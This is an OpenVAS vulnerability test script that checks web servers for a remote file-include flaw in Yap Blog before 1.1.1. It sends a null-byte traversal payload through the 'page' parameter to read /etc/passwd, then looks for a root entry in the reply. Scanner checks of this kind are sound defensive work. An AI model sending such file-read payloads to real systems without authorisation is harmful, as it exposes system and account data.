###############################################################################
# OpenVAS Vulnerability Test
# $Id: Yap_Blog_remote-file_include.nasl 15 2013-10-27 12:49:54Z jan $
#
# Yap Blog 'index.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Yap Blog is prone to a remote file-include vulnerability because it
  fails to sufficiently sanitize user-supplied input.

  Exploiting this issue may allow an attacker to compromise the
  application and the underlying system; other attacks are also
  possible.

  Versions prior to Yap Blog 1.1.1 are vulnerable.";


if (description)
{
 script_id(100046);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2008-1370");
 script_bugtraq_id(28120);
 script_tag(name:"risk_factor", value:"High");

 script_name("Yap Blog 'index.php' Remote File Include Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if Yap Blog is vulnerable to Remote File Include");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/28120");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/blog","/yap",cgi_dirs());
foreach d (dir)
{ 
 url = string(d, "/index.php?page=/etc/passwd%00");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )continue;

 if( egrep(pattern:"root:x:0:[01]:.*", string: buf) )
   {    
     security_hole(port:port);
     exit(0);
   } else {
     # etc/passwd not readeable. Perhaps windows or open basedir. Try
     # to include yap rss.php. If included this results in "Cannot
     # modify header..."
     url = string(d, "/index.php?page=rss.php%00");
     req = http_get(item:url, port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
     if( buf == NULL )continue;

     if( egrep(pattern:"Cannot modify header information - headers already sent.*", string: buf) )
     {
      security_hole(port:port);
      exit(0);
     }  
   }  
}
exit(0);
